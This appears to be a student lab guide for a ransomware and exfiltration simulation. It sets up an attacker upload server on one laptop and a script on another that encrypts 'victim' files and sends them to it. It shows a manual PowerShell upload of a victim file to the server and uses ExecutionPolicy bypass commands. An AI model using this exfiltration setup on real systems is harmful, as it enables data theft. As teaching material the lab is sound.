# 🌐 Two-Laptop Network Setup Guide

## 📋 Overview
This guide explains how to run the cyber-security simulation across **two separate laptops**:
- **Laptop A (Server)**: Runs the attacker's C&C server (`server.js`)
- **Laptop B (Client)**: Runs the malware simulation (`main.py` or `simulation.ps1`)

---

## 🔧 Step 1: Find Your Server IP Address (Laptop A)

### On Windows (Server Laptop):
```powershell
ipconfig
```

Look for **IPv4 Address** - typically looks like:
- `192.168.x.x`
- `10.x.x.x`
- `172.16.x.x`

**Example Output:**
```
Wireless LAN adapter Wi-Fi:
   Connection-specific DNS Suffix  . : home
   IPv4 Address. . . . . . . . . . . : 192.168.1.100
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1
```

**Note:** You need the **IPv4 Address** (NOT the default gateway or DNS)

---

## 📍 Step 2: Configure Files with Server IP

### Update these files with your server's IP address:

#### **File 1: `source/Attacker/main.py`**
```python
SERVER_IP = "192.168.1.100"  # <-- CHANGE THIS to your server's IP
```

#### **File 2: `source/Attacker/simulation.ps1`**
```powershell
$ServerIP = "192.168.1.100"  # <-- CHANGE THIS to your server's IP
```

---

## 🚀 Step 3: Start Server (Laptop A - Your Laptop)

### Terminal 1 - Start Node.js Server:
```powershell
cd "E:\cadt\y3-term1\cyber-Security\cyber-project\cyber_project_T1Y3\source\Attacker"
npm install  # Only needed first time
node server.js
```

### Expected Output:
```
📁 Uploads directory exists
============================================================
🚀 Attacker Server is running!
============================================================

📍 Server URL: http://192.168.1.100:5000

🔗 For remote clients, use: http://192.168.1.100:5000

📌 Available endpoints:
   - Ping:   http://192.168.1.100:5000/ping
   - Upload: POST http://192.168.1.100:5000/upload

============================================================
```

**⚠️ Keep this terminal open!** The server must stay running.

---

## 💻 Step 4: Setup Client (Laptop B - Other Laptop)

### Copy Project Files to Laptop B:
1. Copy the entire `cyber_project_T1Y3` folder to Laptop B
2. Or use Git:
   ```powershell
   git clone https://github.com/Choeng-Rayu/cyber_project_T1Y3.git
   ```

### Install Python Requirements:
```powershell
pip install requests cryptography
```

---

## 🎯 Step 5: Create Victim Files (Laptop B)

### Create the victim directory structure:
```powershell
# Create directory
mkdir "C:\MalwareLab\VictimFiles"

# Create authorization file
New-Item "C:\MalwareLab\VictimFiles\ALLOW_SIMULATION.txt" -Force

# Create sample victim files
@"
This is sensitive company data - Document 1
Username: admin
Password: secret123
"@ | Out-File "C:\MalwareLab\VictimFiles\document1.txt"

@"
This is confidential project information
Project Budget: $1,000,000
Timeline: Q1 2025
"@ | Out-File "C:\MalwareLab\VictimFiles\document2.txt"

@"
Customer Database Export
Name, Email, Phone
John, john@email.com, 555-1234
Jane, jane@email.com, 555-5678
"@ | Out-File "C:\MalwareLab\VictimFiles\data.csv"
```

---

## ▶️ Step 6: Run Malware Simulation (Laptop B)

### Option A: Run Encryption + Upload (Python)

```powershell
cd "C:\path\to\cyber_project_T1Y3\source\Attacker"

python main.py
```

**Expected Output:**
```
Files Encrypted + Transfer Attempted
```

**Check the logs:**
```powershell
cat malware_log.txt
```

### Option B: Run File Upload (PowerShell)

```powershell
powershell -ExecutionPolicy Bypass -File simulation.ps1
```

**Expected Output:**
```
Starting SAFE simulation...
Uploading document1.txt...
Uploaded: document1.txt
Uploading document2.txt...
Uploaded: document2.txt
Uploading data.csv...
Uploaded: data.csv
Simulation complete.
```

---

## ✅ Step 7: Verify Results (Laptop A - Server)

### Check Server Terminal Output:
You should see upload confirmations:
```
[14:23:45] POST /upload
  📤 Receiving file: document1.txt
  ✅ File uploaded successfully
     - Original name: document1.txt
     - Stored as: 1732790625000-document1.txt
     - Size: 12.34 KB

[14:23:46] POST /upload
  📤 Receiving file: document2.txt
  ✅ File uploaded successfully
     - Original name: document2.txt
     - Stored as: 1732790626000-document2.txt
     - Size: 5.67 KB
```

### Check Uploaded Files:
```powershell
dir "E:\cadt\y3-term1\cyber-Security\cyber-project\cyber_project_T1Y3\source\Attacker\uploads"
```

---

## 🧪 Step 8: Advanced Testing

### Test 1: Verify Server Connectivity
```powershell
# On Laptop B, test if you can reach the server
curl http://192.168.1.100:5000/ping
```

**Expected Response:**
```json
{"message":"Server is alive"}
```

### Test 2: Manual File Upload (PowerShell)
```powershell
$file = "C:\MalwareLab\VictimFiles\document1.txt"
$url = "http://192.168.1.100:5000/upload"
$form = @{ file = Get-Item $file }
Invoke-WebRequest -Uri $url -Method Post -Form $form
```

### Test 3: Multiple Runs
Run the simulation multiple times to see cumulative uploads in the server's uploads directory.

---

## ⚠️ Troubleshooting

### Problem: "Connection refused" or "Server not found"
**Solution:** 
- Verify server is running on Laptop A
- Check firewall isn't blocking port 5000
- Verify you're using the correct IP address (not localhost)

### Problem: "ALLOW_SIMULATION.txt not found"
**Solution:**
```powershell
New-Item "C:\MalwareLab\VictimFiles\ALLOW_SIMULATION.txt" -Force
```

### Problem: Python says "module not found"
**Solution:**
```powershell
pip install requests cryptography
```

### Problem: PowerShell says "cannot open file"
**Solution:**
```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

---

## 🔐 Security Notes for Network Testing

✅ **Safe because:**
- Uses local network only (not internet)
- Encryption is reversible
- No actual data destruction
- Authorization file prevents accidental runs

⚠️ **Remember:**
- Only use on authorized networks
- Don't use on public/shared WiFi
- Change IP address in code when running with different server
- Keep firewall enabled

---

## 📝 Quick Reference

| Component | Location | Role |
|-----------|----------|------|
| **Server** | Laptop A | Receives files on port 5000 |
| **Client Script** | Laptop B | Sends files to server |
| **Victim Files** | Laptop B | `C:\MalwareLab\VictimFiles\` |
| **Uploaded Files** | Laptop A | `source\Attacker\uploads\` |
| **Logs** | Laptop B | `malware_log.txt` |

---

## 🎓 Learning Outcomes

After completing this experiment, you'll understand:
- ✅ How malware communicates over networks
- ✅ Client-server architecture for data exfiltration
- ✅ File encryption and transmission
- ✅ Network troubleshooting
- ✅ Cybersecurity attack patterns

---

**Happy experimenting! 🚀**
